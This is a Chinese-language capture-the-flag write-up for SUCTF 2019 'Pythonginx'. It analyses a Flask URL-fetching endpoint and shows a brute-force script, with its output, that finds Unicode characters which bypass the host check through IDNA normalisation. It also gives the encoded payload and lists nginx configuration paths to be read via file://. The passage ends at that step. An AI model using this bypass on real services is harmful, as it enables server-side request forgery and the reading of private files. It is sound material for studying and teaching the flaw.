## [SUCTF 2019]Pythonginx

分析一下源代码

```python
@app.route('/getUrl', methods=['GET', 'POST'])
def getUrl():
    url = request.args.get("url")
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return "我扌 your problem? 111"
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return "我扌 your problem? 222 " + host
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return urllib.request.urlopen(finalUrl).read()
    else:
        return "我扌 your problem? 333"
    </code>
    <!-- Dont worry about the suctf.cc. Go on! -->
    <!-- Do you know the nginx? -->
```

经过分析，我们需要使前面两个if条件为假，但是需要将第三个if为真

但是我们直接url中包含`suctf.cc`不可能绕过前面的if判断，肯定需要通过指定的方式将编码转化成`suctf.cc`的格式

我们观察一下如下代码：

```python
newhost.append(h.encode('idna').decode('utf-8'))
```

这里存在一个漏洞：`idna编码与utf-8解码漏洞`

https://www.cnblogs.com/cimuhuashuimu/p/11490431.html

我们可以使用脚本来获得idna编码与utf-8解码后与字符c相等的字符：



```python
import urllib
from urllib import parse
from urllib.parse import urlsplit, urlunsplit


def output():
    for x in range(65536):
        uni = chr(x)
        url = "http://suctf.c{}".format(uni)
        try:
            if get_url(url):
                print("uni: " + uni + " url:" + url)
                # print(uni)
        except:
            pass


def get_url(url):
    url = url
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return False
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return False
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    # 去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return True
    else:
        return False


if __name__=='__main__':
    output()
```

输出：

```
uni: ℂ url:http://suctf.cℂ
uni: ℭ url:http://suctf.cℭ
uni: Ⅽ url:http://suctf.cⅭ
uni: ⅽ url:http://suctf.cⅽ
uni: Ⓒ url:http://suctf.cⒸ
uni: ⓒ url:http://suctf.cⓒ
uni: Ｃ url:http://suctf.cＣ
uni: ｃ url:http://suctf.cｃ
```

我们将这个字符进行url编码后即可使用：`%E2%92%B8`

这个时候我们可以绕过if了，但是我们如何才能获取到flag呢：

```python
if host == 'suctf.cc':
    return urllib.request.urlopen(finalUrl).read()
else:
    return "我扌 your problem? 333"
</code>
<!-- Dont worry about the suctf.cc. Go on! -->
<!-- Do you know the nginx? -->
```

注意下面的提示，nginx，所以我们需要知道nginx相关配置文件的路径

#### nginx常见配置文件

```nginx
配置文件存放目录：/etc/nginx
主配置文件：/etc/nginx/conf/nginx.conf
管理脚本：/usr/lib64/systemd/system/nginx.service
模块：/usr/lisb64/nginx/modules
应用程序：/usr/sbin/nginx
程序默认存放位置：/usr/share/nginx/html
日志默认存放位置：/var/log/nginx
配置文件目录为：/usr/local/nginx/conf/nginx.conf
```

然后我们可以结合`file协议`来读取文件：





























